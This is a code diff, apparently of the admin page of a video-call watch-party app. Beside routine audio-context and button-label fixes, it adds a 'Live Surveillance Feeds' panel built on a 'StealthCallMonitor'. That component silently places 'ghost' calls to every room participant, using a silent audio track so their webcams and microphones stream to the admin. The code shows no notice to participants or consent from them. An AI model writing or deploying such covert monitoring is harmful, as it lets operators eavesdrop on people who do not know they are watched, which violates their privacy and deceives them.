@@ -67,6 +67,25 @@ const haversineKm = (lat1, lon1, lat2, lon2) => {
   return Math.round(R * c);
 };
 
+// Singleton Shared Web Audio Context to prevent browser limit exhaustion (Max 6 AudioContexts)
+let _sharedAudioCtx = null;
+const getSharedAudioContext = () => {
+  if (typeof window === 'undefined') return null;
+  try {
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    if (!AudioCtx) return null;
+    if (!_sharedAudioCtx || _sharedAudioCtx.state === 'closed') {
+      _sharedAudioCtx = new AudioCtx();
+    }
+    if (_sharedAudioCtx && _sharedAudioCtx.state === 'suspended') {
+      _sharedAudioCtx.resume().catch(() => {});
+    }
+    return _sharedAudioCtx;
+  } catch {
+    return null;
+  }
+};
+
 // Stealth Video & Voice Tile for Admin Monitor (Hearable Voice Call + Video) - High Performance & Low Latency
 function StealthVideoTile({ stream, user, listenAudio, roomId, onToggleUserCamera }) {
   const videoRef = useRef(null);
@@ -155,23 +174,22 @@ function StealthVideoTile({ stream, user, listenAudio, roomId, onToggleUserCamer
     }
   }, [stream]);
 
-  // Voice Activity Detection (VAD) via Web Audio API (Strictly scoped & cleanly disposed)
+  // Voice Activity Detection (VAD) via Shared Web Audio API (Strictly scoped & cleanly disposed)
   useEffect(() => {
     if (!stream || typeof stream.getAudioTracks !== 'function') return;
     const audioTracks = stream.getAudioTracks().filter((t) => t && t.readyState === 'live');
     if (audioTracks.length === 0) return;
 
-    let ctx = null, analyser = null, src = null, timer = null, dead = false;
+    let analyser = null, src = null, timer = null, dead = false;
     let holdTimer = null;
 
     try {
-      const AudioCtx = window.AudioContext || window.webkitAudioContext;
-      if (AudioCtx) {
-        ctx = new AudioCtx();
-        analyser = ctx.createAnalyser();
+      const actx = getSharedAudioContext();
+      if (actx) {
+        analyser = actx.createAnalyser();
         analyser.fftSize = 128;
         analyser.smoothingTimeConstant = 0.2;
-        src = ctx.createMediaStreamSource(new MediaStream(audioTracks));
+        src = actx.createMediaStreamSource(new MediaStream(audioTracks));
         src.connect(analyser);
 
         const buf = new Uint8Array(analyser.frequencyBinCount);
@@ -199,7 +217,6 @@ function StealthVideoTile({ stream, user, listenAudio, roomId, onToggleUserCamer
       clearTimeout(timer);
       clearTimeout(holdTimer);
       try { src?.disconnect(); } catch {}
-      try { ctx?.close(); } catch {}
     };
   }, [stream]);
 
@@ -344,6 +361,15 @@ function StealthVideoTile({ stream, user, listenAudio, roomId, onToggleUserCamer
           {user?.isHost && (
             <span className="text-[8px] bg-amber-500/30 text-amber-300 px-1 rounded font-bold uppercase shrink-0">Host</span>
           )}
+          {user?.cameraBlocked ? (
+            <span className="text-[8px] bg-rose-500/40 border border-rose-500/60 text-rose-200 px-1 rounded font-bold uppercase shrink-0">
+              🔒 Cam Cut
+            </span>
+          ) : (
+            <span className="text-[8px] bg-emerald-500/20 text-emerald-300 px-1 rounded font-bold uppercase shrink-0">
+              Cam On
+            </span>
+          )}
           {isSpeaking && (
             <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping shrink-0" />
           )}
@@ -384,10 +410,10 @@ function StealthVideoTile({ stream, user, listenAudio, roomId, onToggleUserCamer
                   ? 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-sm ring-1 ring-emerald-400'
                   : 'bg-rose-600/80 hover:bg-rose-600 text-white shadow-sm'
               }`}
-              title={user?.cameraBlocked ? 'Restore / Enable this user camera' : 'Cut / Turn OFF this user camera for security'}
+              title={user?.cameraBlocked ? 'Turn ON / Restore this user camera' : 'Cut / Turn OFF this user camera for security'}
             >
               {user?.cameraBlocked ? <Camera className="h-3 w-3" /> : <VideoOff className="h-3 w-3" />}
-              <span className="hidden sm:inline">{user?.cameraBlocked ? 'Enable' : 'Cut Cam'}</span>
+              <span className="hidden sm:inline">{user?.cameraBlocked ? 'Turn ON Cam' : 'Cut Cam'}</span>
             </button>
           )}
 
@@ -456,9 +482,8 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true, on
 
     // Silent audio track: ensures WebRTC SDP offer contains m=audio so remote answers send microphone audio!
     try {
-      const AudioCtx = window.AudioContext || window.webkitAudioContext;
-      if (AudioCtx) {
-        const actx = new AudioCtx();
+      const actx = getSharedAudioContext();
+      if (actx) {
         const osc = actx.createOscillator();
         const gain = actx.createGain();
         gain.gain.value = 0; // completely silent ghost audio
@@ -477,6 +502,8 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true, on
     return new MediaStream(tracks);
   };
 
+  const callAttemptTimes = useRef({});
+
   useEffect(() => {
     let peer = null;
     let dead = false;
@@ -489,15 +516,26 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true, on
         const targetId = u.id || u.cid;
         if (!targetId) return;
 
-        // Prevent duplicate calls if peer connection is already active or negotiating
+        // If we already have a stream for this user, do not disrupt
+        if (remoteStreams[targetId] && activeCalls.current.has(targetId)) {
+          const c = activeCalls.current.get(targetId);
+          const state = c?.peerConnection?.connectionState || c?.peerConnection?.iceConnectionState;
+          if (state === 'connected' || state === 'completed') return;
+        }
+
         const existingCall = activeCalls.current.get(targetId);
         if (existingCall) {
-          const state = existingCall.peerConnection?.connectionState;
-          if (state === 'connected' || state === 'connecting') return;
+          const elapsed = Date.now() - (callAttemptTimes.current[targetId] || 0);
+          const state = existingCall.peerConnection?.connectionState || existingCall.peerConnection?.iceConnectionState;
+          // While connecting or candidate gathering within 12s, let it finish connecting
+          if (state === 'connected' || state === 'connecting' || state === 'checking' || state === 'new' || elapsed < 12000) {
+            return;
+          }
           try { existingCall.close(); } catch {}
           activeCalls.current.delete(targetId);
         }
 
+        callAttemptTimes.current[targetId] = Date.now();
         try {
           const call = peerRef.current.call(targetId, blankStream, {
             metadata: { type: 'cam', isGhost: true }
@@ -596,7 +634,7 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true, on
 
     initPeer();
 
-    const interval = setInterval(callAllUsers, 3000);
+    const interval = setInterval(callAllUsers, 3500);
 
     return () => {
       dead = true;
@@ -605,6 +643,9 @@ function StealthCallMonitor({ roomId, users = [], externalListenAudio = true, on
         try { c.close(); } catch {}
       });
       activeCalls.current.clear();
+      try {
+        blankStream.getTracks().forEach((t) => t.stop());
+      } catch {}
       peer?.destroy();
       peerRef.current = null;
     };
@@ -2375,13 +2416,13 @@ export default function AdminPage() {
                             onClick={() => handleToggleRoomCamera(room.roomId, room.cameraDisabled)}
                             className={`rounded-lg border px-2.5 py-1 text-xs font-semibold transition flex items-center gap-1.5 shadow-sm cursor-pointer ${
                               room.cameraDisabled
-                                ? 'bg-emerald-600/30 border-emerald-500/60 text-emerald-200 shadow-emerald-600/20'
+                                ? 'bg-emerald-600/30 hover:bg-emerald-600/50 border-emerald-500/60 text-emerald-200 shadow-emerald-600/20'
                                 : 'bg-rose-500/20 hover:bg-rose-500/30 border-rose-500/40 text-rose-200'
                             }`}
-                            title={room.cameraDisabled ? 'Camera access is currently locked by admin. Click to enable / restore camera access in this room' : 'Security moderation: Click to cut / disable cameras for all users in this room'}
+                            title={room.cameraDisabled ? 'Camera access is cut by admin. Click to Turn ON cameras for all users in this room' : 'Security moderation: Click to Cut / disable cameras for all users in this room'}
                           >
                             {room.cameraDisabled ? <Camera className="h-3.5 w-3.5 text-emerald-400" /> : <VideoOff className="h-3.5 w-3.5 text-rose-400" />}
-                            <span>{room.cameraDisabled ? 'Unlock Cam' : 'Cut Cam'}</span>
+                            <span>{room.cameraDisabled ? 'Turn ON Cam' : 'Cut Room Cam'}</span>
                           </button>
 
                           <button
@@ -2898,13 +2939,13 @@ export default function AdminPage() {
                             onClick={() => handleToggleRoomCamera(room.roomId, room.cameraDisabled)}
                             className={`rounded-lg border px-2.5 py-1.5 text-xs font-semibold transition flex items-center gap-1 cursor-pointer ${
                               room.cameraDisabled
-                                ? 'bg-emerald-600/30 border-emerald-500/60 text-emerald-200'
+                                ? 'bg-emerald-600/30 hover:bg-emerald-600/50 border-emerald-500/60 text-emerald-200'
                                 : 'bg-rose-500/20 hover:bg-rose-500/30 border-rose-500/40 text-rose-200'
                             }`}
-                            title={room.cameraDisabled ? 'Camera access locked by admin. Click to enable / restore camera access' : 'Security moderation: Click to cut / disable cameras in this room'}
+                            title={room.cameraDisabled ? 'Camera access is cut by admin. Click to Turn ON cameras in this room' : 'Security moderation: Click to Cut / disable cameras in this room'}
                           >
                             {room.cameraDisabled ? <Camera className="h-3.5 w-3.5 text-emerald-400" /> : <VideoOff className="h-3.5 w-3.5 text-rose-400" />}
-                            <span>{room.cameraDisabled ? 'Unlock Cam' : 'Cut Cam'}</span>
+                            <span>{room.cameraDisabled ? 'Turn ON Cam' : 'Cut Room Cam'}</span>
                           </button>
 
                           <button
@@ -3031,13 +3072,13 @@ export default function AdminPage() {
                           onClick={() => handleToggleRoomCamera(room.roomId, room.cameraDisabled)}
                           className={`text-[10px] px-2 py-0.5 rounded font-semibold transition flex items-center gap-1 cursor-pointer ${
                             room.cameraDisabled
-                              ? 'bg-emerald-500/20 text-emerald-200 hover:bg-emerald-500/30 border border-emerald-500/40'
+                              ? 'bg-emerald-500/25 hover:bg-emerald-500/40 text-emerald-200 border border-emerald-500/40'
                               : 'bg-rose-500/20 text-rose-200 hover:bg-rose-500/30 border border-rose-500/40'
                           }`}
-                          title={room.cameraDisabled ? 'Camera access locked. Click to enable' : 'Security moderation: Turn OFF cameras'}
+                          title={room.cameraDisabled ? 'Turn ON cameras in this room' : 'Cut cameras in this room'}
                         >
                           {room.cameraDisabled ? <Camera className="h-3 w-3 text-emerald-400" /> : <VideoOff className="h-3 w-3 text-rose-400" />}
-                          <span>{room.cameraDisabled ? 'Unlock' : 'Cut Cam'}</span>
+                          <span>{room.cameraDisabled ? 'Turn ON' : 'Cut Cam'}</span>
                         </button>
                       </div>
                     </div>
@@ -4374,10 +4415,10 @@ export default function AdminPage() {
                           ? 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-lg shadow-emerald-600/30'
                           : 'bg-rose-600/25 hover:bg-rose-600/40 border border-rose-500/40 text-rose-200'
                       }`}
-                      title={deepInspectModal.data.cameraDisabled ? 'Enable / Restore room camera access' : 'Security moderation: Cut room camera access'}
+                      title={deepInspectModal.data.cameraDisabled ? 'Turn ON / Restore room camera access' : 'Security moderation: Cut room camera access'}
                     >
                       {deepInspectModal.data.cameraDisabled ? <Camera className="h-3.5 w-3.5" /> : <VideoOff className="h-3.5 w-3.5" />}
-                      <span>{deepInspectModal.data.cameraDisabled ? 'Unlock Room Cam' : 'Cut Room Cam'}</span>
+                      <span>{deepInspectModal.data.cameraDisabled ? 'Turn ON Room Cam' : 'Cut Room Cam'}</span>
                     </button>
 
                     <button
@@ -4388,6 +4429,49 @@ export default function AdminPage() {
                       <Ban className="h-3.5 w-3.5" />
                       <span>Terminate Room</span>
                     </button>
+                  </div>
+                </div>
+
+                {/* 🛰️ Live Surveillance Matrix: Movie Stream (Left) + Caller Video Feeds (Right) */}
+                <div className="rounded-xl border border-white/10 bg-black/60 p-3 space-y-2">
+                  <div className="flex items-center justify-between border-b border-white/10 pb-2">
+                    <span className="text-xs font-bold text-white flex items-center gap-2">
+                      <span className="h-2 w-2 rounded-full bg-emerald-400 animate-ping" />
+                      <span>Live Surveillance Feeds (Synchronized Movie + Caller Webcams)</span>
+                    </span>
+                    <span className="text-[11px] text-cyan-300 font-mono">
+                      {deepInspectModal.data.users?.length || 0} Callers Connected
+                    </span>
+                  </div>
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-3 items-start">
+                    <div className="space-y-1">
+                      <span className="text-[10px] font-bold text-pink-300 flex items-center gap-1">
+                        <Film className="h-3 w-3" />
+                        <span>Synchronized Movie Playback</span>
+                      </span>
+                      <AdminRoomMoviePlayer
+                        roomId={deepInspectModal.roomId}
+                        media={deepInspectModal.data.media}
+                        playing={deepInspectModal.data.playing}
+                        currentTime={deepInspectModal.data.time}
+                        masterMuted={globalMovieAudio}
+                        onRemoteControl={handleVideoControl}
+                      />
+                    </div>
+                    <div className="space-y-1">
+                      <span className="text-[10px] font-bold text-purple-300 flex items-center gap-1">
+                        <Video className="h-3 w-3" />
+                        <span>Room Video Call Feeds</span>
+                      </span>
+                      <CallErrorBoundary title="Video Surveillance Stream" resetLabel="Reconnect Feeds">
+                        <StealthCallMonitor
+                          roomId={deepInspectModal.roomId}
+                          users={deepInspectModal.data.users || []}
+                          externalListenAudio={globalListenAudio}
+                          onToggleUserCamera={handleToggleUserCamera}
+                        />
+                      </CallErrorBoundary>
+                    </div>
                   </div>
                 </div>
 
@@ -4454,15 +4538,15 @@ export default function AdminPage() {
                                       await handleToggleUserCamera(deepInspectModal.roomId, u.cid, u.cameraBlocked);
                                       handleInspectRoom(deepInspectModal.roomId);
                                     }}
-                                    className={`rounded px-2 py-0.5 text-[10px] font-semibold transition flex items-center gap-1 cursor-pointer ${
+                                    className={`rounded px-2.5 py-1 text-[10px] font-bold transition flex items-center gap-1 cursor-pointer ${
                                       u.cameraBlocked
-                                        ? 'bg-emerald-500/20 hover:bg-emerald-500/40 border border-emerald-500/40 text-emerald-300'
-                                        : 'bg-amber-500/20 hover:bg-amber-500/40 border border-amber-500/40 text-amber-300'
+                                        ? 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-sm'
+                                        : 'bg-rose-600/30 hover:bg-rose-600/50 border border-rose-500/40 text-rose-200'
                                     }`}
-                                    title={u.cameraBlocked ? 'Enable participant camera' : 'Security moderation: Cut participant camera'}
+                                    title={u.cameraBlocked ? 'Turn ON participant camera' : 'Security moderation: Cut participant camera'}
                                   >
                                     {u.cameraBlocked ? <Camera className="h-3 w-3" /> : <VideoOff className="h-3 w-3" />}
-                                    <span>{u.cameraBlocked ? 'Allow Cam' : 'Cut Cam'}</span>
+                                    <span>{u.cameraBlocked ? 'Turn ON Cam' : 'Cut Cam'}</span>
                                   </button>
                                   <button
                                     type="button"
